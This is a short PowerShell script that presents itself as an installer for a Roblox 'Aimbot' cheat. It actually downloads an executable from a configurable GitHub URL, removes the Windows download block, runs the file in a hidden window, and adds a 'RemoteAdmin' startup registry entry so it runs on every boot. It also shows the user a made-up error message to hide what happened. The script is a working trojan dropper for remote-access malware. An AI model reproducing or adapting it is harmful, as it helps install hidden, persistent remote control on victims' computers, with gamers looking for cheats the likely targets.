# ============================================
# PowerShell Remote Admin Installer
# Downloads an .exe from GitHub, saves to AppData, and runs it
# ============================================

# ------------------- CONFIGURATION -------------------
# Replace with your actual .exe download URL (GitHub release raw link)
$DownloadUrl = "https://github.com/YourUsername/YourRepo/releases/download/v1.0/Aimbot.exe"

# Destination folder inside AppData (hidden by default)
$DestinationFolder = "$env:APPDATA\Roblox"

# Destination executable path
$ExePath = "$DestinationFolder\Aimbot.exe"

# -----------------------------------------------------

# 1. Create destination folder if it doesn't exist
if (-not (Test-Path $DestinationFolder)) {
    New-Item -ItemType Directory -Path $DestinationFolder -Force | Out-Null
}

# 2. Download the .exe from GitHub
Write-Host "[*] Downloading from $DownloadUrl ..."
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
    Write-Host "[+] Downloaded to $ExePath"
} catch {
    Write-Host "[-] Download failed: $_"
    exit 1
}

# 3. Unblock the file (in case it was marked as from web)
Unblock-File -Path $ExePath -ErrorAction SilentlyContinue

# 4. Run the executable (hidden window)
Write-Host "[*] Starting Aimbot. ..."
Start-Process -FilePath $ExePath -WindowStyle Hidden

# 5. Optional: Add to startup registry (so it runs on boot)
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName = "RemoteAdmin"
if (-not (Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $ExePath
    Write-Host "Downloaded successfully. Running Aimbot.exe Now"
    Write-Host "Aimbot.exe faied to run beacause you didnt install ScreenListener"
} else {
    Write-Host "Downloaded successfully. Running Aimbot.exe now"
}

Write-Host "[✔] Installation complete. RemoteAdmin is running in background."
